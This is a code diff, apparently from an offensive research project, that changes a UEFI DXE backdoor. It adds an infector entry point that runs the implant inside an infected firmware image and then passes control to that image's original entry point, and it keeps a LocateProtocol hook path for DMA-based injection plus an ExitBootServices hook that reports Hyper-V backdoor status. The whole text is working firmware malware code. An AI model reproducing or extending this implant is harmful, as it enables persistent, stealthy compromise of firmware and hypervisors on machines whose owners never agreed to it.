@@ -52,20 +52,34 @@ _ModuleEntryPoint(
 
 EFI_STATUS
 EFIAPI
-BackdoorEntryInfected(
+BackdoorEntryDma(
     EFI_GUID *Protocol, VOID *Registration, VOID **Interface
+);
+
+EFI_STATUS 
+EFIAPI 
+BackdoorEntryInfected(
+    EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
 );
 
 // PE image section with information for infector
 __declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
 { 
     // address of LocateProtocol() hook handler
-    (UINT64)&BackdoorEntryInfected,
+    (UINT64)&BackdoorEntryDma,
 
     // address of original LocateProtocol() function
     0,
 
     // address of EFI_SYSTEM_TABLE
+    0,
+
+    // *******************************************************
+
+    // address of infector entry point
+    (UINT64)&BackdoorEntryInfected,
+
+    // RVA of original entry point
     0
 };
 
@@ -84,6 +98,9 @@ UINT8 *m_TrampolineAddr = NULL;
 
 // Hyper-V stuff
 HYPER_V_INFO m_HvInfo;
+
+// report backdoor status using INFECTOR_STATUS_ADDR and HYPER_V_INFO_ADDR memory regions
+BOOLEAN m_bReportStatus = FALSE;
 //--------------------------------------------------------------------------------------
 void ConsolePrintScreen(char *Message)
 {    
@@ -151,7 +168,10 @@ void ConsoleInitialize(void)
     {
         EFI_GUID VariableGuid = BACKDOOR_VAR_GUID;
 
-        *m_PendingOutputAddr = PagesAddr;
+        if (m_bReportStatus)
+        {
+            *m_PendingOutputAddr = PagesAddr;
+        }
 
         m_PendingOutput = (char *)PagesAddr;        
         std_memset(m_PendingOutput, 0, DEBUG_OUTPUT_SIZE);
@@ -574,8 +594,11 @@ EFI_STATUS EFIAPI new_ExitBootServices(
     // prevent to call DXE services during runtime phase
     m_TextOutput = NULL;
 
-    // report Hyper-V information
-    std_memcpy(pHvInfo, &m_HvInfo, sizeof(HYPER_V_INFO));
+    if (m_bReportStatus)
+    {
+        // report Hyper-V information
+        std_memcpy(pHvInfo, &m_HvInfo, sizeof(HYPER_V_INFO));
+    }
 
     // exit to the original function
     return old_ExitBootServices(ImageHandle, Key);
@@ -651,10 +674,14 @@ VOID BackdoorEntryResident(VOID *Image)
     m_HvInfo.ImageEntry = NULL;
     m_HvInfo.VmExit = NULL;
 
-    pHvInfo->Status = BACKDOOR_NOT_READY;
+    if (m_bReportStatus)
+    {
+        // notify about successful DXE driver execution
+        pInfectorStatus->Status = BACKDOOR_SUCCESS;
 
-    // notify about successful DXE driver execution
-    pInfectorStatus->Status = BACKDOOR_SUCCESS;
+        // Hyper-V backdoor is not ready yet
+        pHvInfo->Status = BACKDOOR_NOT_READY;
+    }
 
 #if !defined(BACKDOOR_DEBUG_SCREEN)
 
@@ -664,16 +691,14 @@ VOID BackdoorEntryResident(VOID *Image)
 
 }
 //--------------------------------------------------------------------------------------
-EFI_STATUS
-EFIAPI
-BackdoorEntryInfected(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
+EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
 {
+    VOID *Base = NULL;
     EFI_LOCATE_PROTOCOL LocateProtocol = NULL;
     EFI_SYSTEM_TABLE *SystemTable = NULL;
 
     // get backdoor image base address
-    VOID *Base = ImageBaseByAddress(get_addr());
-    if (Base == NULL)
+    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
     {
         return EFI_SUCCESS;
     }
@@ -685,6 +710,7 @@ BackdoorEntryInfected(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
     }    
 
     m_ImageBase = Base;  
+    m_bReportStatus = TRUE;
 
     LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
     SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    
@@ -697,6 +723,45 @@ BackdoorEntryInfected(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
 
     // call hooked function
     return LocateProtocol(Protocol, Registration, Interface);
+}
+//--------------------------------------------------------------------------------------
+EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
+{
+    VOID *Base = NULL;
+    EFI_LOADED_IMAGE *LoadedImage = NULL;
+
+    // get backdoor image base address
+    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
+    {
+        return EFI_SUCCESS;
+    }
+
+    // setup correct image relocations
+    if (!LdrProcessRelocs(Base, Base))
+    {
+        return EFI_SUCCESS;   
+    }    
+
+    m_ImageBase = Base;  
+
+    // call real entry point
+    _ModuleEntryPoint(NULL, SystemTable);
+
+    // get current image information
+    m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);  
+
+    if (LoadedImage && m_InfectorConfig.OriginalEntryPoint != 0)
+    {
+        EFI_IMAGE_ENTRY_POINT Entry = (EFI_IMAGE_ENTRY_POINT)RVATOVA(
+            LoadedImage->ImageBase,
+            m_InfectorConfig.OriginalEntryPoint
+        );
+
+        // call original entry point
+        return Entry(ImageHandle, SystemTable);
+    }
+
+    return EFI_SUCCESS;
 }
 //--------------------------------------------------------------------------------------
 EFI_STATUS 
